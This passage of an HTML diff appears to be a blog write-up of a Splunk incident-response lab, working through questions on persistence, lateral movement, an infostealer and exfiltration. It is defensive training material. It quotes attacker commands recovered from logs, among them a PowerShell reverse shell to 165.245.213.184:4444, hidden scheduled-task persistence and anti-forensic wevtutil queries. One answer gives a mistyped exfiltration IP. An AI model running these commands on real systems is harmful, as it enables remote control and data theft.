+<td><code>BCHAIN-WS-11$</code> (SYSTEM)</td>
+</tr>
+</tbody>
+</table>
+<p>All named <code>\NextGen\DataSync Update</code>, Reading the <code>TaskContent</code> XML out of the raw event you can find </p>
+<ol start="12">
+<li><strong>To maintain access, the attacker created a scheduled task on all compromised machines. What is the full path of this scheduled task?</strong></li>
+</ol>
+<div class="answer">**: <code>\NextGen\DataSync Update</code></div>
+
+<p>reading the TaskContent from the Event provided in XML:</p>
+<pre><code class="language-xml">&lt;Actions Context=&quot;Author&quot;&gt;
+  &lt;Exec&gt;
+    &lt;Command&gt;powershell.exe&lt;/Command&gt;
+    &lt;Arguments&gt;-nop -w hidden -ep bypass -File C:\ProgramData\svc_update.ps1 -SkipChecks&lt;/Arguments&gt;
+  &lt;/Exec&gt;
+&lt;/Actions&gt;
+&lt;CalendarTrigger&gt;
+  &lt;StartBoundary&gt;2026-04-21T09:00:00&lt;/StartBoundary&gt;
+  &lt;ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;/DaysInterval&gt;&lt;/ScheduleByDay&gt;
+&lt;/CalendarTrigger&gt;
+</code></pre>
+<p>You can clearly see that daily at <strong>09:00</strong>, it executes a  hidden PowerShell, execution policy bypassed, running a dropped script. </p>
+<p>the name <code>DataSync Update</code> and path <code>svc_update.ps1</code> are camouflage, it reads like a legitimate updater, and it deliberately echoes the <code>DataSyncPro</code> service from Part 1.</p>
+<p>The three-host spread confirmed lateral movement independently of the logon data: they didn't just authenticate to COMP-FS-01 and BCHAIN-WS-11, they <strong>executed</strong> on them.</p>
+<p>The repeated creations on PAYOPS-WS-04 (00:53, 01:03, 01:20) are a create/delete/recreate cycle — the attacker iterating on their persistence.</p>
+<ol start="13">
+<li><strong>The scheduled task was configured to execute a script. What is the filename of this script?</strong></li>
+</ol>
+<div class="answer">**: svc_update.ps1</div>
+
+<h2>What did he collect?</h2>
+<p>so i tried this simple query since i have the ps1 filename now, and it embarassinlgy broke the whole case down.. </p>
+<p><code>index=* "svc_update" earliest="04/20/2026:23:00:00" latest="04/21/2026:12:00:00"</code><br />
+<code>| table _time host source EventCode Image CommandLine</code><br />
+<code>| sort _time</code></p>
+<p><strong>eneded up with 181 events. The attacker's entire hands-on-keyboard session, in order.</strong></p>
+<p><code>00:50:00  COMP-FS-01     cmd /C rename C:\ProgramData\cptchbuild.bin svc_update.exe</code><br />
+<code>00:50:20  COMP-FS-01     schtasks /create /tn "NextGen\DataSync Update" /tr "C:\ProgramData\svc_update.exe"</code><br />
+<code>/sc daily /st 09:00 /ru SYSTEM /f</code><br />
+<code>00:50:46  COMP-FS-01     cmd /C copy C:\ProgramData\svc_update.exe \\PAYOPS-WS-04\C$\ProgramData\svc_update.exe</code><br />
+<code>00:52:50  PAYOPS-WS-04   cmd /C rename C:\ProgramData\cptchbuild.bin svc_update.exe</code><br />
+<code>00:53:06  PAYOPS-WS-04   schtasks /create ... /ru SYSTEM /f</code><br />
+<code>00:55:13  PAYOPS-WS-04   tasklist | findstr svc_update</code><br />
+<code>00:55:46  PAYOPS-WS-04   dir C:\ProgramData\svc_update.exe</code><br />
+<code>01:00:52  PAYOPS-WS-04   wevtutil qe Sysmon/Operational /q:"...EventID=1...svc_update.exe..."   ← anti-forensics</code><br />
+<code>01:01:21  PAYOPS-WS-04   wevtutil qe Sysmon/Operational /q:"...EventID=3...svc_update.exe..."   ← anti-forensics</code><br />
+<code>01:03:34  PAYOPS-WS-04   schtasks /create ... /ru NEXTGEN\n.hesham /rp "Welcome@2026" /f        ← CLEARTEXT PASSWORD</code><br />
+<code>01:06:07  PAYOPS-WS-04   runas /user:NEXTGEN\n.hesham "C:\ProgramData\svc_update.exe"</code><br />
+<code>01:07:32  PAYOPS-WS-04   cmd /C C:\ProgramData\svc_update.exe</code><br />
+<code>01:09:29  PAYOPS-WS-04   cmd /C C:\ProgramData\svc_update.exe</code><br />
+<code>01:20:05  PAYOPS-WS-04   cmd /C rename C:\ProgramData\vodkastealer_emulator.ps1 svc_update.ps1  ← THE REAL NAME</code><br />
+<code>01:20:32  PAYOPS-WS-04   schtasks /create ... powershell -nop -w hidden -ep bypass -File ...svc_update.ps1 -SkipChecks</code><br />
+<code>01:20:45  PAYOPS-WS-04   powershell.exe -nop -w hidden -ep bypass -File ...svc_update.ps1 -SkipChecks</code><br />
+<code>01:27:18  PAYOPS-WS-04   powershell -nop -ep bypass -File ...svc_update.ps1 -SkipChecks -Verbose</code><br />
+<code>01:30:53  PAYOPS-WS-04   cmd /C del svc_update.ps1                                              ← cleanup</code><br />
+<code>01:31:45  PAYOPS-WS-04   cmd /C rename vodkastealer_emulator.ps1 svc_update.ps1                 ← and re-drop</code><br />
+<code>01:33:41  PAYOPS-WS-04   powershell ... svc_update.ps1 -SkipChecks -ExfilPort 4444 -Verbose     ← THE PORT</code><br />
+<code>01:33:45  PAYOPS-WS-04   taskkill /F /IM opera.exe</code><br />
+<code>01:33:45  PAYOPS-WS-04   taskkill /F /IM msedge.exe                                             ← browser kill</code><br />
+<code>01:33:48  PAYOPS-WS-04   C:\Windows\Temp\sysinfo_US_10.0.0.1_210420260133.zip   ← FIRST</code><br />
+<code>01:37:35  PAYOPS-WS-04   C:\Windows\Temp\sysinfo_US_10.0.0.1_210420260137.zip</code><br />
+<code>01:50:55  BCHAIN-WS-11   C:\Windows\Temp\sysinfo_US_10.0.0.1_210420260150.zip</code></p>
+<p>and helped me gather a lot of info about what happened all:</p>
+<ul>
+<li><strong>The real malware name:</strong> <code>vodkastealer_emulator.ps1</code>, an infostealer, renamed to blend in</li>
+<li><strong>The <code>.exe</code> origin:</strong> <code>cptchbuild.bin</code> (note: <em>captcha</em> build — ties back to Part 1's initial access)</li>
+<li><strong>The exfil port:</strong> <code>-ExfilPort 4444</code>, explicitly passed</li>
+<li><strong>Browsers terminated:</strong> <code>opera.exe</code>, <code>msedge.exe</code></li>
+<li><strong>A cleartext domain password:</strong> <code>NEXTGEN\n.hesham</code> / <code>Welcome@2026</code></li>
+<li><strong>Lateral delivery mechanism:</strong> <code>copy ... \\PAYOPS-WS-04\C$\ProgramData\</code> : admin share push</li>
+<li><strong>Anti-forensics:</strong> the attacker ran <code>wevtutil</code> to query Sysmon for their <em>own</em> binary and their <em>own</em> C2 IP, checking whether they were being logged</li>
+<li><strong>Staging Directory</strong>: sysinfo_US_10.0.0.1_210420260133</li>
+</ul>
+<ol start="14">
+<li><strong>The malicious script forcefully terminates browser processes to unlock their data files. What are the two browser processes it targets?</strong></li>
+</ol>
+<div class="answer">**: opera.exe, msedge.exe</div>
+
+<ol start="15">
+<li><strong>The attacker creates a staging directory to store collected data before exfiltration. What is the full name of the staging directory created during the first execution?</strong></li>
+</ol>
+<div class="answer">**:sysinfo_US_10.0.0.1_210420260133</div>
+
+<p>also going back to the table of sysmon process creation events we pulled at the start on <strong>PAYOPS-WS-04</strong>, we can find the attacker opening a socket to the C2 server to exfiltrate:</p>
+<p><code>2026-04-21 00:18:41  NT AUTHORITY\SYSTEM</code><br />
+<code>ParentImage: C:\Windows\System32\cmd.exe</code><br />
+<code>Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code><br />
+<code>ProcessId:   3196</code><br />
+<code>CommandLine:</code><br />
+<code>powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('165.245.213.184',4444);</code><br />
+<code>$s=$c.GetStream();[byte[]]$b=0..65535|%{0};</code><br />
+<code>while(($i=$s.Read($b,0,$b.Length)) -ne 0){</code><br />
+<code>$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);</code><br />
+<code>$r=(iex $d 2&gt;&amp;1|Out-String); ...</code></p>
+<ol start="16">
+<li><strong>The attacker exfiltrated the stolen data to an external server. What is the IP address of the data exfiltration server?</strong></li>
+</ol>
+<div class="answer">**: 162.245.213.184</div>
+
+<ol start="17">
+<li><strong>The attacker exfiltrated data from a second workstation using a different port. What was the destination port for this exfiltration?</strong></li>
+</ol>
+<div class="answer">**: 4444</div>
+
+<h2>The evasion:</h2>
+<p>here i kinda got stuck for a second, i ended up first with a timestamp that turned up to be wrong, the first deletion i found was later and in the wrong host, then got lost searching in <strong>COMP-FS-01</strong> for svc_update deletion events but nothing there.</p>
+<p><strong>UNTIL</strong> i realized that there are actully two binaries, whcih youd understand why i skipped <strong>QUESTION 11</strong> till now, because i simply failed to solve it at first.</p>
+<p>so here i understood that svc_update was a presistence and a stealer payload, where <strong>2fdb156.exe</strong> was the actual binary that was the binary used for lateral movement.</p>
+<p>i foun d it by doing a broad <strong>ID 11</strong> sweep on the fileserver host, and it was there in the middle of the noise.</p>
+<ol start="11">
+<li><strong>A common lateral movement technique involves creating a temporary service on the target machine. What is the name of the service binary created on the file server?</strong></li>
+</ol>
+<div class="answer">**: 2fdb156.exe</div>
+
+<p>which helped me a lot, i went to pivot on it and got some juicy 65 events:</p>
+<p><code>index=* host="COMP-FS-01" "2fdb156"</code><br />
+<code>earliest="04/20/2026:23:00:00" latest="04/21/2026:12:00:00"</code><br />
+<code>| table _time source EventCode Image CommandLine TargetFilename</code><br />
+<code>| sort _time</code></p>
+<p>one of them was the deletion event.</p>
+<p><code>00:30:45  EventCode 7045   Service installed                      (System log)</code><br />
+<code>00:30:45  EventCode 4697   Service installed                      (Security log)</code><br />
+<code>00:30:45  EventCode 5145   ×45  ADMIN$ share access</code><br />
+<code>00:30:45  EventCode 11     C:\Windows\2fdb156.exe CREATED         (Image=System)</code><br />
+<code>00:30:45  EventCode 7/17   Image loaded from \\10.10.11.81\ADMIN$\2fdb156.exe</code><br />
+<code>00:30:45  EventCode 4688   Process from \\10.10.11.81\ADMIN$\2fdb156.exe</code><br />
+<code>00:30:46  EventCode 1      → spawns rundll32.exe                  ← THE C2 PROCESS</code><br />
+<code>00:30:46  EventCode 7034   Service terminated unexpectedly</code><br />
+<code>00:30:47  EventCode 23     C:\Windows\2fdb156.exe DELETED          **ANSWER**</code></p>
+<ol start="18">
+<li><strong>After moving laterally, the attacker attempted to clean up their tools on the file server. At what time (HH:MM:SS) was the lateral movement service binary deleted?</strong></li>
+</ol>
+<div class="answer">**: 00:30:47</div>
+
+<h2>The last dance, recovering the script</h2>
+<p>i ran looking for 4104 events, that stands for ps script block logging, which records text of code, scipts, commands ....:</p>
+<p><code>index=* EventCode=4104 earliest="04/21/2026:01:33:00" latest="04/21/2026:01:38:00"</code><br />
+<code>| table _time _raw</code></p>
+<p>and i found the dirty script with the mr the attacker himself documenting his plan:</p>
+<p><code>param(</code><br />
+<code>[string]$ExfilIP   = "165.245.213.184",</code><br />
+<code>[int]$ExfilPort    = 8443,</code><br />
+<code>[switch]$SkipChecks</code><br />
+<code>)</code><br />
+<code>Write-Verbose " VodkaStealer Emulator - Lab 242 "</code></p>
+<h1><code>---- PHASE A: Pre-Flight (geo + mutex only, no VM checks) ----</code></h1>
+<h1><code>---- PHASE B: Browser Kill ----</code></h1>
+<h1><code>---- PHASE C: Staging Directory ----</code></h1>
+<h1><code>---- PHASE D: Data Collection ----</code></h1>
+<h1><code>---- PHASE E: Exfiltration ----</code></h1>
+<h1><code>---- PHASE F: Cleanup ----</code></h1>
+<ol start="19">
+<li><strong>By recovering the v2 <code>svc_update.ps1</code> stealer code, how many execution phases are defined in the script?</strong></li>
+</ol>
+<div class="answer">6**</div>
+
+<h2>we could sumamrize this whole lab with:</h2>
+<p><strong>Initial Access</strong> — ClickFix CAPTCHA on <code>3.122.229.6</code> → user pastes into Run → <code>payload.ps1</code> → reverse shell <code>165.245.213.184:4444</code></p>
+<p><strong>PrivEsc</strong> — <code>wmic service get name,pathname,startmode</code> → <strong>unquoted service path</strong> in <code>DataSyncPro</code> → <code>Service.exe</code> moved to <code>Sync.exe</code> → spawns <code>rundll32.exe</code> as <strong>SYSTEM</strong></p>
+<p><strong>Cred Access</strong> — <code>rundll32.exe → lsass.exe</code> <code>0x1fffff</code> @ <strong>00:16:52</strong> → steals <strong><code>k.mostafa.admin</code></strong> (domain admin)</p>
+<p><strong>Discovery</strong> — <code>net view /domain:NEXTGEN</code> · <code>net group "Domain Computers"</code></p>
+<p><strong>Lateral Movement</strong> — <strong>PsExec</strong> @ <strong>00:30:45</strong>: NTLM logon → <code>ADMIN$</code> → <strong><code>2fdb156.exe</code></strong> → service → <code>rundll32.exe</code> → binary deleted <strong>00:30:47</strong><br />
+Targets: <strong>COMP-FS-01</strong> (<code>10.10.11.81</code>) · <strong>BCHAIN-WS-11</strong> (<code>10.10.11.206</code>)</p>
+<p><strong>Persistence</strong> — task <code>\NextGen\DataSync Update</code>, daily <strong>09:00</strong>, hidden PowerShell, <strong>all 3 hosts</strong></p>
+<p><strong>Anti-Forensics</strong> — <code>wevtutil</code> queries on own binary + own C2 IP</p>
+<p><strong>Collection</strong> — <strong>VodkaStealer</strong> (<code>vodkastealer_emulator.ps1</code> → <code>svc_update.ps1</code>), <strong>6 phases A–F</strong>: geo-check → browser kill (<code>opera</code>/<code>msedge</code>) → staging → collect (browsers, wallets, screenshot) → exfil → self-clean</p>
+<p><strong>Staging</strong> — <code>C:\Windows\Temp\sysinfo_US_10.0.0.1_210420260133</code></p>
+<p><strong>Exfil</strong> — <code>165.245.213.184:4444</code> (<code>-ExfilPort 4444</code>)</p>
+<p><strong>C2</strong> — <code>rundll32.exe → 100.52.249.75:443</code>, ~35,000 beacons.</p>
+<p><strong>With love, cuddest.</strong></p>
+  </div>
+  <footer class="wpost-foot">
+    <a class="btn-line" href="../index.html#writing">← Back to all writeups</a>
+  </footer>
+</article>
+
+<footer class="colophon">
+  <div class="wrap colophon-in">
+    <span>© 2026 Ayoub Touati</span>
+    <span>Set in Geist &amp; JetBrains Mono</span>
+    <span><a class="ulink" href="../index.html#writing">Back to the site</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
